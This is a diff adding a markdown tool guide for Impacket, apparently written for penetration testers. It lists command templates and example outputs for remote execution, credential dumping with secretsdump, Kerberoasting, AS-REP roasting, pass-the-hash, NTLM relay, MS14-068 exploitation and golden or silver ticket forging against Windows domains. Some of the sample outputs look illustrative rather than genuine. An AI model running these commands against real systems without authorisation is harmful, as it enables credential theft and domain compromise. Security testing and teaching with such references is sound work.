@@ -1,0 +1,348 @@
+---
+title: "Impacket"
+description: "Impacket tool guide; includes tool's purpose,primary uses,core features,data sources, common commands and example of command's usages."
+tags: ['network', 'windows', 'active directory']
+---
+
+**Impacket** is an **open-source** collection of Python classes for working with network protocols. It provides low-level programmatic access to packets and protocol implementations including SMB, MSRPC, NTLM, Kerberos, WMI, LDAP, and many others. Impacket is essential for penetration testing Windows environments and Active Directory infrastructures, offering powerful tools for authentication, lateral movement, and data extraction.
+
+**Here are the primary uses of Impacket:**
+
+  * **SMB Protocol Interaction:** Impacket provides comprehensive SMB protocol support, enabling file operations, share enumeration, and remote command execution on Windows systems. This functionality is crucial for lateral movement and data exfiltration in Windows networks.
+
+  * **Kerberos Authentication:** The toolkit includes extensive Kerberos implementation, supporting ticket requests, golden ticket attacks, silver ticket attacks, and Kerberos delegation abuse. These capabilities are essential for Active Directory penetration testing.
+
+  * **Pass-the-Hash Attacks:** Impacket enables pass-the-hash attacks, allowing authentication using NTLM hashes without knowing plaintext passwords. This technique is fundamental for lateral movement after credential compromise.
+
+  * **Remote Command Execution:** Various Impacket tools facilitate remote command execution through different protocols including WMI, DCOM, scheduled tasks, and service creation, providing multiple methods for achieving code execution on target systems.
+
+  * **Credential Dumping:** Impacket tools can extract credentials from Windows systems remotely, dumping SAM hashes, LSA secrets, cached credentials, and NTDS.dit database contents from domain controllers.
+
+  * **Active Directory Enumeration:** The toolkit provides powerful Active Directory enumeration capabilities, querying LDAP for users, groups, computers, trusts, and other domain information essential for understanding target environments.
+
+
+
+
+## Core Features​
+
+  * SMB Protocol Implementation
+  * Kerberos Protocol Support
+  * NTLM Authentication
+  * DCE/RPC Implementation
+  * LDAP Query Support
+  * WMI Command Execution
+  * PSExec-like Functionality
+  * Secretsdump Credential Extraction
+  * Ticket Manipulation
+  * Pass-the-Hash Support
+  * Pass-the-Ticket Support
+  * Golden/Silver Ticket Creation
+  * Network Protocol Parsing
+  * Remote Registry Access
+
+
+
+## Data sources​
+
+  * SMB Shares
+  * Windows Registry
+  * Active Directory LDAP
+  * SAM Database
+  * LSA Secrets
+  * NTDS.dit Database
+  * Kerberos Tickets
+  * DCE/RPC Services
+  * WMI Objects
+  * Windows Event Logs
+  * Cached Credentials
+  * Network Traffic
+
+
+
+## Common Impacket Commands​
+
+### 1\. PSExec - Remote Command Execution​
+
+  * This command provides remote command execution similar to Microsoft's PSExec tool. It uploads and executes a service binary on the target system.
+
+
+    
+    
+```
+psexec.py <domain>/<username>:<password>@<target>  
+```
+### 2\. SMBExec - Stealthier Remote Execution​
+
+  * This command executes commands remotely without writing files to disk, using only native Windows commands and services for stealthier operations.
+
+
+    
+    
+```
+smbexec.py <domain>/<username>:<password>@<target>  
+```
+### 3\. WMIExec - WMI-Based Execution​
+
+  * This command leverages Windows Management Instrumentation (WMI) for remote command execution, providing another method for achieving code execution.
+
+
+    
+    
+```
+wmiexec.py <domain>/<username>:<password>@<target>  
+```
+### 4\. DComExec - DCOM-Based Execution​
+
+  * This command uses DCOM (Distributed Component Object Model) for remote execution, exploiting various DCOM applications for command execution.
+
+
+    
+    
+```
+dcomexec.py <domain>/<username>:<password>@<target>  
+```
+### 5\. AtExec - Scheduled Task Execution​
+
+  * This command executes commands via Windows Task Scheduler, creating and executing scheduled tasks remotely for one-time command execution.
+
+
+    
+    
+```
+atexec.py <domain>/<username>:<password>@<target> "command"  
+```
+### 6\. Secretsdump - Credential Extraction​
+
+  * This command dumps credentials from Windows systems including SAM hashes, LSA secrets, cached credentials, and NTDS.dit from domain controllers.
+
+
+    
+    
+```
+secretsdump.py <domain>/<username>:<password>@<target>  
+```
+### 7\. Secretsdump with NTDS.dit​
+
+  * This command extracts all domain credentials from a domain controller's NTDS.dit database, providing complete Active Directory password hashes.
+
+
+    
+    
+```
+secretsdump.py -just-dc <domain>/<username>:<password>@<dc_ip>  
+```
+### 8\. GetNPUsers - AS-REP Roasting​
+
+  * This command identifies and extracts Kerberos AS-REP hashes for users with "Do not require Kerberos preauthentication" enabled.
+
+
+    
+    
+```
+GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat -outputfile hashes.txt  
+```
+### 9\. GetUserSPNs - Kerberoasting​
+
+  * This command requests service tickets for accounts with Service Principal Names, enabling offline password cracking of service account passwords.
+
+
+    
+    
+```
+GetUserSPNs.py <domain>/<username>:<password> -request -outputfile hashes.txt  
+```
+### 10\. TicketConverter - Ticket Format Conversion​
+
+  * This command converts Kerberos tickets between different formats (ccache to kirbi and vice versa) for use with different tools.
+
+
+    
+    
+```
+ticketConverter.py <ticket_file> <output_file>  
+```
+### 11\. GetTGT - Request Kerberos TGT​
+
+  * This command requests a Kerberos Ticket Granting Ticket (TGT) using credentials or hashes, useful for pass-the-ticket attacks.
+
+
+    
+    
+```
+getTGT.py <domain>/<username>:<password>  
+```
+### 12\. GetST - Request Service Ticket​
+
+  * This command requests specific service tickets using a TGT, enabling access to specific services with stolen or forged tickets.
+
+
+    
+    
+```
+getST.py -spn <service>/<target> -impersonate <user> <domain>/<username>:<password>  
+```
+### 13\. GoldenPAC - MS14-068 Exploitation​
+
+  * This command exploits the MS14-068 vulnerability to gain domain admin privileges by forging Kerberos tickets with elevated privileges.
+
+
+    
+    
+```
+goldenPac.py <domain>/<username>:<password>@<target>  
+```
+### 14\. SMBClient - Interactive SMB Shell​
+
+  * This command provides an interactive SMB client for browsing shares, uploading/downloading files, and executing commands on remote systems.
+
+
+    
+    
+```
+smbclient.py <domain>/<username>:<password>@<target>  
+```
+### 15\. SMBServer - Host SMB Share​
+
+  * This command creates an SMB server to host files for exfiltration or to provide files to target systems during exploitation.
+
+
+    
+    
+```
+smbserver.py <share_name> <directory_path>  
+```
+### 16\. Lookupsid - SID Enumeration​
+
+  * This command enumerates users and groups by bruteforcing SIDs (Security Identifiers), useful for user enumeration when other methods are restricted.
+
+
+    
+    
+```
+lookupsid.py <domain>/<username>:<password>@<target>  
+```
+### 17\. Reg - Remote Registry Access​
+
+  * This command provides remote registry access for querying and modifying registry keys on target Windows systems.
+
+
+    
+    
+```
+reg.py <domain>/<username>:<password>@<target> <query/add/delete> <key>  
+```
+### 18\. Services - Service Management​
+
+  * This command manages Windows services remotely, allowing creation, modification, starting, and stopping of services for persistence or execution.
+
+
+    
+    
+```
+services.py <domain>/<username>:<password>@<target> <list/create/start/stop/delete>  
+```
+### 19\. NTLM Relay - NTLM Relay Attack​
+
+  * This command performs NTLM relay attacks, intercepting and relaying authentication attempts to target systems for unauthorized access.
+
+
+    
+    
+```
+ntlmrelayx.py -t <target> -smb2support  
+```
+### 20\. GetADUsers - Enumerate AD Users​
+
+  * This command enumerates Active Directory users through LDAP queries, gathering usernames, email addresses, and other user attributes.
+
+
+    
+    
+```
+GetADUsers.py -all <domain>/<username>:<password> -dc-ip <dc_ip>  
+```
+### 21\. GetUserSPNs with Hash​
+
+  * This command performs Kerberoasting using NTLM hash instead of password for authentication, useful for pass-the-hash scenarios.
+
+
+    
+    
+```
+GetUserSPNs.py -hashes <lm_hash>:<nt_hash> <domain>/<username>@<dc_ip> -request  
+```
+### 22\. Help and Usage Information​
+
+  * This command displays help information for specific Impacket tools, showing available options and usage examples.
+
+
+    
+    
+```
+<tool_name>.py -h  
+```
+Alternative usage:
+    
+    
+```
+<tool_name>.py --help  
+```
+## Output Examples of Impacket Commands​
+
+Command| Example Usage| Function| Output Example  
+---|---|---|---  
+PSExec| `psexec.py DOMAIN/admin:P@ssw0rd@192.168.1.10`| Remote command execution via SMB.| `C:\Windows\system32>whoami `   
+` domain\admin`  
+SMBExec| `smbexec.py DOMAIN/admin:P@ssw0rd@192.168.1.10`| Stealthy remote execution.| `C:\>whoami `   
+` domain\admin`  
+WMIExec| `wmiexec.py DOMAIN/admin:P@ssw0rd@192.168.1.10`| WMI-based command execution.| `[*] SMBv3.0 dialect used `   
+` C:\>hostname`  
+DComExec| `dcomexec.py DOMAIN/admin:P@ssw0rd@192.168.1.10`| DCOM-based execution.| `[*] Executing command via DCOM `   
+` C:\>whoami`  
+AtExec| `atexec.py DOMAIN/admin:P@ssw0rd@192.168.1.10 "whoami"`| Scheduled task execution.| `[*] Creating task... `   
+` [*] Running task... `   
+` domain\admin`  
+Secretsdump SAM| `secretsdump.py admin:P@ssw0rd@192.168.1.10`| Dumps local credentials.| `Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: `   
+` Guest:501:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`  
+Secretsdump NTDS| `secretsdump.py -just-dc DOMAIN/admin:P@ssw0rd@192.168.1.1`| Extracts domain credentials.| `[*] Dumping Domain Credentials (domain\username:rid:lmhash:nthash:::) `   
+` Administrator:500:aad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::`  
+GetNPUsers| `GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 192.168.1.1`| AS-REP roasting attack.| `$krb5asrep$23$user@DOMAIN:hash... `   
+` [*] Found 3 users vulnerable to AS-REP roasting`  
+GetUserSPNs| `GetUserSPNs.py DOMAIN/user:P@ssw0rd -request`| Kerberoasting attack.| `ServicePrincipalName Name MemberOf PasswordLastSet LastLogon `   
+` MSSQLSvc/sql.domain.com:1433 sqlservice 2023-01-15 14:20:35.123456 <never>`  
+GetTGT| `getTGT.py DOMAIN/user:P@ssw0rd`| Requests Kerberos TGT.| `[*] Saving ticket in user.ccache `   
+` [*] Use: export KRB5CCNAME=user.ccache`  
+GetST| `getST.py -spn cifs/target DOMAIN/user:P@ssw0rd`| Requests service ticket.| `[*] Getting ST for user `   
+` [*] Saving ticket in user.ccache`  
+SMBClient| `smbclient.py DOMAIN/admin:P@ssw0rd@192.168.1.10`| Interactive SMB client.| `# shares `   
+` ADMIN$ `   
+` C$ `   
+` IPC$`  
+SMBServer| `smbserver.py share /tmp/share`| Hosts SMB share.| `[*] Config file parsed `   
+` [*] Incoming connection from 192.168.1.10`  
+Lookupsid| `lookupsid.py DOMAIN/user:P@ssw0rd@192.168.1.10`| Enumerates SIDs.| `500: DOMAIN\Administrator (SidTypeUser) `   
+` 501: DOMAIN\Guest (SidTypeUser) `   
+` 512: DOMAIN\Domain Admins (SidTypeGroup)`  
+Reg Query| `reg.py DOMAIN/admin:P@ssw0rd@192.168.1.10 query -keyName HKLM\\SOFTWARE`| Queries remote registry.| `[*] Querying HKLM\SOFTWARE `   
+` [*] Subkeys found: Microsoft, Classes, Policies`  
+Services List| `services.py DOMAIN/admin:P@ssw0rd@192.168.1.10 list`| Lists remote services.| `[*] Services: `   
+` [*] Spooler - Print Spooler (Running) `   
+` [*] W32Time - Windows Time (Running)`  
+NTLM Relay| `ntlmrelayx.py -t smb://192.168.1.10 -smb2support`| Relays NTLM authentication.| `[*] Servers started, waiting for connections `   
+` [*] SMBD: Received connection from 192.168.1.20`  
+GetADUsers| `GetADUsers.py -all DOMAIN/user:P@ssw0rd -dc-ip 192.168.1.1`| Enumerates AD users.| `Name Email PasswordLastSet `   
+` Administrator admin@domain.com 2023-01-15 10:30:00 `   
+` john.doe john@domain.com 2023-02-20 14:15:30`  
+Pass-the-Hash| `psexec.py -hashes :fc525c9683e8fe067095ba2ddc971889 DOMAIN/admin@192.168.1.10`| PTH authentication.| `[*] Authenticating with hash `   
+` C:\Windows\system32>`  
+Secretsdump LSA| `secretsdump.py -security DOMAIN/admin:P@ssw0rd@192.168.1.10`| Dumps LSA secrets.| `[*] Dumping LSA Secrets `   
+` [*] $MACHINE.ACC:aad3b435b51404ee:hash... `   
+` [*] DefaultPassword: P@ssw0rd123`  
+Kerberos Ticket| `ticketConverter.py ticket.ccache ticket.kirbi`| Converts ticket format.| `[*] converting ccache to kirbi... `   
+` [*] done`  
+Golden Ticket| `ticketer.py -nthash <krbtgt_hash> -domain-sid <sid> -domain DOMAIN Administrator`| Creates golden ticket.| `[*] Creating golden ticket for Administrator `   
+` [*] Saving ticket in Administrator.ccache`  
+Silver Ticket| `ticketer.py -nthash <hash> -spn cifs/target -domain-sid <sid> -domain DOMAIN user`| Creates silver ticket.| `[*] Creating silver ticket `   
+` [*] Ticket saved`  
+RDP Check| `rdp_check.py DOMAIN/user:P@ssw0rd@192.168.1.10`| Checks RDP access.| `[*] Checking RDP access... `   
+` [+] RDP is available and accessible`
